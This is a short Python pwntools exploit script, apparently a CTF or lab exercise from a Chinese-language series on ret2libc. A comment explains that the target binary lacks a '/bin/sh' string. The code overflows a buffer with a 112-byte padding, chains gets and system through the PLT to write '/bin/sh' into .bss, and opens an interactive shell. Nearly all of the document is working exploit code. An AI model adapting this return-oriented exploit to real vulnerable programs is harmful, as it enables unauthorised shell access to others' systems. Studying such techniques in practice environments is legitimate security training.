from pwn import *

'''
    PWN 第三章第二节 libc2

    此章节要点:
        程序有system但无'/bin/sh'片段, 需要通过gadget调用read手动传入'/bin/sh'并执行system('/bin/sh')实现pwn
'''


def ret2_libc2_1(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2libc2'):
    io = process([file_name])
    file_elf = ELF(file_name)
    system_plt = file_elf.plt['system']
    gets_plt = file_elf.plt['gets']
    bss_buf = 0x0804A080

    print(hex(file_elf.bss()))

    payload_1 = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(bss_buf) + p32(bss_buf)
    io.sendline(payload_1)

    payload_2 = b'/bin/sh'
    io.sendline(payload_2)

    io.interactive()


if __name__ == '__main__':
    ret2_libc2_1()
